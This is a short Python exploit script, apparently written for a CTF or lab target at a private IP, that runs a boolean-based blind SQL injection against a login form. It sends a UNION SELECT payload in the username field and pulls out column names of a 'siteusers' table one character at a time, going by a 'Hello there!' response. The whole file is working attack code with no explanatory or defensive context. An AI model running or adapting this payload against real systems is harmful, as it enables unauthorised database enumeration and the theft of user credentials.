import requests
import sys

def cols(url):
    words = "0123456789mabcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    l,i,b = len(words), 0, ""
    while i < l:
        data = {
            "username": "' union select 1,2,3,4 from information_schema.columns where table_schema ='mywebsite' and table_name='siteusers' and column_name like binary '" + b + words[i] + "%'-- -",
            "password": "whocares"
        }
        r = requests.post(url, data=data)
        if "Hello there!" in r.text:
            b += words[i]
            i = 0
        else:
            sys.stdout.write(f"\rExtracting column: {b}{words[i].ljust(20)}")
            sys.stdout.flush()
            i += 1

if __name__ == "__main__":
    url = "http://10.10.22.239/index.php"
    cols(url)
    print("\n")
